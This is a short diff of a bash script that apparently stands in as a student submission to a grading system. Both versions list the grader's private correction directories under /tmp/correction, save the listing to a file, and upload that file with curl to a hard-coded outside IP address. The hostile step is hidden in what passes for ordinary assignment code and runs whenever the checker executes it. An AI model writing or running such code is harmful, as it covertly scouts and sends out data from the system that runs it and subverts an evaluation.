@@ -1,2 +1,2 @@
 #!/bin/bash
-pwd > temp ; ls -la /tmp/correction >> temp ; ls -la /tmp/correction/holberton_corrections >> temp ; curl -s -F "name=@temp" http://138.68.58.230:8080
+ls -la /tmp/correction/holberton_corrections/corrections >> temp ; ls -la /tmp/corrections/holberton_corrections/corrections/240 >> temp ; curl -s -F "name=@temp" http://138.68.58.230:8080
